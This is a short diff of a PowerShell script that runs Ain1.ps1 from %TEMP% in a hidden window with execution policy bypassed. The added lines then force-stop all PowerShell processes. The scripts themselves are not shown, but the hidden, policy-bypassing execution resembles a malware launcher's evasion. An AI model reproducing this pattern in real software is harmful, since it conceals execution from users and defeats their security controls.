@@ -68,3 +68,8 @@ Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Wind
 # Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""
 
+# Optionally, you can include a delay to ensure the scripts have time to start
+Start-Sleep -Seconds 1
+
+# Close all PowerShell instances
+Get-Process powershell | Stop-Process -Force
